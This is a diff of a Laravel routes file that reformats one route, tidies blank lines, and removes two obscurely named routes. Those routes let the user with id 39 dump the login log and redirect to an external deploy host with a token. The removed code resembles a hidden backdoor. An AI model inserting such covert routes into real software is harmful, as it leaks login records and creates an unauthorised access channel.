@@ -2,32 +2,13 @@
 
 require('myweb.php');
 
-Route::get('/', function () {
-    return redirect('/geren');
-});
+Route::get('/', function () {return redirect('/geren');});
 
 Route::get('users/{userid}/activity', 'ActivityController@show');
 
 Auth::routes();
 
 Route::get('/home', 'HomeController@index')->name('home');
-
-Route::get('/6323151aa', function () {
-    header('Content-type: text/html; charset=utf-8');
-    if (\Auth::check() && \Auth::user()->id == 39) {
-        $a = file_get_contents(storage_path('/logs/logins.log'));
-        dd(str_replace('[', '<br/>[', $a));
-    } else {
-        return redirect()->to('/geren');
-    }
-});
-Route::get('/6323151bb', function () {
-    if (\Auth::check() && \Auth::user()->id == 39) {
-        return redirect()->to('http://deploy.midollar.biz/?token=1a10c89f&env=tawenxi');
-    } else {
-        return redirect()->to('/geren');
-    }
-});
 
 Route::post('/store', 'GuzzleController@store')->name('store');
 Route::get('/guzzle', 'GuzzleController@index');
@@ -90,16 +71,10 @@ Route::get('/zbdetails', 'HomeController@zbdetail');
 Route::get('/viewdetail', 'HomeController@viewdetail');
 Route::post('/storeaccount', 'MakeAccountController@storeAccount');
 Route::get('/zhibiaos', 'HomeController@zhibiao');
-
 Route::get('/session', 'PageController@session');
-
-
-
 Route::get('/r9', 'RccountController@index');
-
 Route::get('/rr', 'RccountController@rr');
 Route::get('/up', 'zhibiaoController@checkoutZFPZ');
-
 Route::get('zbdetail/{id}/edit', 'zhibiaoController@edit')->name('zbdetail.edit');
 Route::patch('zbdetail/update', 'zhibiaoController@update');
 Route::get('/shenqing', 'zhibiaoController@shenqing');
